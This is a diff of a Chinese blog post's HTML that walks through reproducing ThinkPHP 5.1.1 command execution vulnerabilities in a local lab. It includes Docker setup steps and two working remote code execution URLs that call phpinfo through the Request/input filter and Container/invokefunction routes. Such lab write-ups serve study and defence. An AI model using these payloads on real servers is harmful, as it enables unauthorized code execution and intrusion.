@@ -172,14 +172,11 @@
 <li>查看运行中的docker容器<br><code>docker ps -a</code></li>
 <li>进入一个docker容器<br><code>docker exec -it [container id] bash</code></li>
 <li>拷贝本地文件到docker<br><code>docker cp [本地路径] [container id]:[container 路径]</code></li>
-<li>启动服务<pre><code>service apache2 start
-service mysql start
-</code></pre></li>
+<li>启动服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">service mysql start</span><br></pre></td></tr></table></figure>
+</li>
 </ol>
-<h1 id="0x02-命令执行漏洞利用"><a href="#0x02-命令执行漏洞利用" class="headerlink" title="## 0x02 命令执行漏洞利用"></a>## 0x02 命令执行漏洞利用</h1><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="## 漏洞环境"></a>## 漏洞环境</h2><pre><code>thinkPHP5.1.1
-php 7.3 (必须5.6+)
-靶机IP： 192.168.72.131:89
-</code></pre><h2 id="代码执行："><a href="#代码执行：" class="headerlink" title="## 代码执行："></a>## 代码执行：</h2><p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</code></p>
+<h1 id="0x02-命令执行漏洞利用"><a href="#0x02-命令执行漏洞利用" class="headerlink" title="## 0x02 命令执行漏洞利用"></a>## 0x02 命令执行漏洞利用</h1><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="## 漏洞环境"></a>## 漏洞环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thinkPHP5.1.1</span><br><span class="line">php 7.3 (必须5.6+)</span><br><span class="line">靶机IP： 192.168.72.131:89</span><br></pre></td></tr></table></figure>
+<h2 id="代码执行："><a href="#代码执行：" class="headerlink" title="## 代码执行："></a>## 代码执行：</h2><p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</code></p>
 <p><img src="/2019/08/30/thinkphp5-1-lou-dong-fu-xian/0.png" alt=""></p>
 <p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p>
 <p><img src="/2019/08/30/thinkphp5-1-lou-dong-fu-xian/4.png" alt=""></p>
